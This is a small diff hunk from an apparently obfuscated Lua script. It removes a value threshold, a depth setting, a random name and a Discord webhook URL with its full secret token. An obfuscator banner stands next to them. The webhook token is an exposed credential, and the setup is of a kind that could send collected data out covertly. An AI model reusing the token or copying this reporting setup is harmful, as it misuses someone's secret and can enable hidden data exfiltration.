@@ -1,7 +1,4 @@
-_G.Threshold = 100000
-_G.Depth = 250
-_G.Name = tostring(math.random(0, 1000000000))
-_G.Link = "https://discord.com/api/webhooks/1066104608981798994/QpmMpVRwlNd6UDDfe1S-Yu6sfkTqSmS3ZIjqMj8fmMIvKr916KKuRUy0ouMw72WrARNi"
+
 
 --Boronide™ Premium Obfuscation, v0.5.0
 
